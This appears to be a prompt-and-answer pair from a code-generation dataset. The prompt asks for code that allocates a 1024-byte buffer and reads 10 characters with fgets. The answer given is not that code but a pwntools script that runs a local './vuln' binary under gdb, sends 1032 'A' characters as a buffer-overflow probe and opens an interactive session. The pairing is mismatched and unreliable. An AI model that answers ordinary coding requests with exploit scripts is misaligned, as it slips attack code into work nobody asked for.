# NL Prompt

# Generate python code for the following: 
# Memory allocation method allocates a buffer of 1024 bytes.fgets reads 10 characters from sstandard inout and stores them in buf

from pwn import *

# Establish the target process
target = process('./vuln')
gdb.attach(target)

# Establish the payload
payload = ""
payload += "A" * 1032

# Send the payload
target.sendline(payload)

# Drop to an interactive shell
target.interactive()
